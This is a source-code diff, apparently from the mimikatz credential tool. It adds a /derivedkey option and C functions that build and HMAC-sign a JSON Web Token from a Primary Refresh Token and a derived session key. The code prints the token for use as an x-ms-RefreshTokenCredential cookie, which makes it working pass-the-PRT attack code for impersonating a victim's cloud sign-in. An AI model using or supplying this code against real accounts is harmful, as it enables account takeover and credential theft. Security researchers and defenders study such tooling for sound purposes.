@@ -7,7 +7,9 @@
 
 NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
 {
-	LPCWSTR szKeyValue, szContext, szLabel, szKeyName;
+	LPCWSTR szKeyValue, szContext, szLabel, szKeyName, szPrt, szIat, szDerivedKey;
+	LPSTR sJWT;
+	__time32_t time32 = 0;
 	BOOL isValidContext = FALSE, isDerivedKey = FALSE;
 	PKIWI_POPKEY pKeyValue;
 	LPVOID pDataOut;
@@ -25,7 +27,7 @@ NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
 	{
 		isValidContext = kull_m_string_stringToHex(szContext, Context, sizeof(Context));
 		if(!isValidContext)
-			PRINT_ERROR(L"context must be an hex string of 48 char (24 bytes) -- it will be random\n");
+			PRINT_ERROR(L"/context must be an hex string of 48 char (24 bytes) -- it will be random\n");
 	}
 	if(!isValidContext)
 		CDGenerateRandomBits(Context, sizeof(Context));
@@ -94,15 +96,35 @@ NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
 				LocalFree(pKeyValue);
 			}
 			else PRINT_ERROR(L"Unable to decode base64\n");
+		}
+		else if(kull_m_string_args_byName(argc, argv, L"derivedkey", &szDerivedKey, NULL))
+		{
+			isDerivedKey = kull_m_string_stringToHex(szDerivedKey, DerivedKey, sizeof(DerivedKey));
+			if(!isDerivedKey)
+				PRINT_ERROR(L"a /derivedkey must be an hex string of 64 char (32 bytes)\n");
+		}
+		else  PRINT_ERROR(L"a /keyvalue:base64data (or raw 32/178 bytes in hex) must be present, or a /derivedkey");
 
-			if(isDerivedKey)
+		if(isDerivedKey)
+		{
+			kprintf(L"Derived Key: ");
+			kull_m_string_wprintf_hex(DerivedKey, sizeof(DerivedKey), 0);
+			kprintf(L"\n");
+
+			if(kull_m_string_args_byName(argc, argv, L"prt", &szPrt, NULL))
 			{
-				kprintf(L"Derived Key: ");
-				kull_m_string_wprintf_hex(DerivedKey, sizeof(DerivedKey), 0);
-				kprintf(L"\n");
+				if(kull_m_string_args_byName(argc, argv, L"iat", &szIat, NULL))
+					time32 = wcstol(szIat, NULL, 0);
+				else _time32(&time32);
+
+				kprintf(L"Issued at  : %ld\n\nSigned JWT : ", time32);
+				if(sJWT = generate_simpleSignature(Context, sizeof(Context), szPrt, &time32, DerivedKey, sizeof(DerivedKey)))
+				{
+					kprintf(L"%S\n\n(for x-ms-RefreshTokenCredential cookie by eg.)\n", sJWT);
+					LocalFree(sJWT);
+				}
 			}
 		}
-		else PRINT_ERROR(L"a /keyvalue:base64data (or raw 32/178 bytes in hex) must be present");
 	}
 	return STATUS_SUCCESS;
 }
@@ -200,4 +222,145 @@ BOOL kuhl_m_dpapi_cloudap_keyvalue_derived_hardware(PNCryptBufferDesc bufferDesc
 		PRINT_ERROR(L"No CNG?\n");
 	}
 	return status;
+}
+
+PSTR basicEscapeJson(PCSTR toEscape)
+{
+	DWORD i, j, lenEscaped;
+	PSTR ret = NULL;
+
+	j = lenEscaped = lstrlenA(toEscape);
+	for(i = 0; i < j; i++)
+	{
+		if((toEscape[i] == '\"') || (toEscape[i] == '/') || (toEscape[i] == '\\'))
+			lenEscaped++;
+	}
+
+	if(ret = (PSTR) LocalAlloc(LPTR, lenEscaped + 1))
+	{
+		for(i = 0, j = 0; j < lenEscaped; i++, j++)
+		{
+			if((toEscape[i] == '\"') || (toEscape[i] == '/') || (toEscape[i] == '\\'))
+				ret[j++] = '\\';
+			ret[j] = toEscape[i];
+		}
+	}
+
+	return ret;
+}
+
+PSTR generate_simpleHeader(PCSTR Alg, LPCBYTE Context, DWORD cbContext)
+{
+	PSTR base64 = NULL, header, ctxBase64, escapedCtxBase64;
+
+	if(kull_m_string_quick_binary_to_base64A(Context, cbContext, &ctxBase64))
+	{
+		if(escapedCtxBase64 = basicEscapeJson(ctxBase64))
+		{
+			if(kull_m_string_sprintfA(&header, "{\"alg\":\"%s\", \"ctx\":\"%s\"}", Alg, escapedCtxBase64))
+			{
+				kull_m_string_quick_binary_to_urlsafe_base64A((const BYTE *) header, lstrlenA(header), &base64);
+				LocalFree(header);
+			}
+			LocalFree(escapedCtxBase64);
+		}
+		LocalFree(ctxBase64);
+	}
+	return base64;
+}
+
+PSTR generate_simplePayload(PCWSTR PrimaryRefreshToken, __time32_t *iat)
+{
+	PSTR base64 = NULL, payload, prtDec, escapedPrt;
+	PBYTE data;
+	DWORD cbData;
+	__time32_t time32;
+
+	if(iat)
+		time32 = *iat;
+	else _time32(&time32);
+
+	if(kull_m_string_quick_urlsafe_base64_to_Binary(PrimaryRefreshToken, &data, &cbData))
+	{
+		if(prtDec = (PSTR) LocalAlloc(LPTR, cbData + 1))
+		{
+			RtlCopyMemory(prtDec, data, cbData);
+			if(escapedPrt = basicEscapeJson(prtDec))
+			{
+				if(kull_m_string_sprintfA(&payload, "{\"refresh_token\":\"%s\", \"is_primary\":\"true\", \"iat\":\"%ld\"}", escapedPrt, time32))
+				{
+					kull_m_string_quick_binary_to_urlsafe_base64A((const BYTE *) payload, lstrlenA(payload), &base64);
+					LocalFree(payload);
+				}
+				LocalFree(escapedPrt);
+			}
+			LocalFree(prtDec);
+		}
+		LocalFree(data);
+	}
+	return base64;
+}
+
+const char cPoint = '.';
+PSTR generate_simpleSignature(LPCBYTE Context, DWORD cbContext, PCWSTR PrimaryRefreshToken, __time32_t *iat, LPCBYTE Key, DWORD cbKey)
+{
+	PSTR jwt = NULL, header64, payload64, signature64;
+	NTSTATUS status;
+	BCRYPT_ALG_HANDLE hAlgorithm;
+	BCRYPT_HASH_HANDLE hHash;
+	DWORD ObjectLength, cbResult;
+	PUCHAR pbHashObject;
+	BYTE Hash[32];
+
+	if(header64 = generate_simpleHeader("HS256", Context, cbContext))
+	{
+		if(payload64 = generate_simplePayload(PrimaryRefreshToken, iat))
+		{
+			__try
+			{
+				status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_SHA256_ALGORITHM, MS_PRIMITIVE_PROVIDER, BCRYPT_ALG_HANDLE_HMAC_FLAG);
+				if(BCRYPT_SUCCESS(status))
+				{
+					status = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PUCHAR) &ObjectLength, sizeof(ObjectLength), &cbResult, 0);
+					if(BCRYPT_SUCCESS(status))
+					{
+						if(pbHashObject = (PUCHAR) LocalAlloc(LPTR, ObjectLength))
+						{
+							status = BCryptCreateHash(hAlgorithm, &hHash, pbHashObject, ObjectLength, (PUCHAR) Key, cbKey, 0);
+							if(BCRYPT_SUCCESS(status))
+							{
+								BCryptHashData(hHash, (PUCHAR) header64, lstrlenA(header64), 0);
+								BCryptHashData(hHash, (PUCHAR) &cPoint, sizeof(cPoint), 0);
+								BCryptHashData(hHash, (PUCHAR) payload64, lstrlenA(payload64), 0);
+								status = BCryptFinishHash(hHash, Hash, sizeof(Hash), 0);
+								if(BCRYPT_SUCCESS(status))
+								{
+									if(kull_m_string_quick_binary_to_urlsafe_base64A(Hash, sizeof(Hash), &signature64))
+									{
+										kull_m_string_sprintfA(&jwt, "%s.%s.%s", header64, payload64, signature64);
+										LocalFree(signature64);
+									}
+								}
+								else PRINT_ERROR(L"BCryptFinishHash: 0x%08x\n", status);
+
+								BCryptDestroyHash(hHash);
+							}
+							else PRINT_ERROR(L"BCryptCreateHash: 0x%08x\n", status);
+							LocalFree(pbHashObject);
+						}
+					}
+					else PRINT_ERROR(L"BCryptGetProperty: 0x%08x\n", status);
+					BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+				}
+				else PRINT_ERROR(L"BCryptOpenAlgorithmProvider: 0x%08x\n", status);
+			}
+			__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
+			{
+				PRINT_ERROR(L"No CNG?\n");
+			}
+			LocalFree(payload64);
+		}
+		LocalFree(header64);
+	}
+	return jwt;
 }
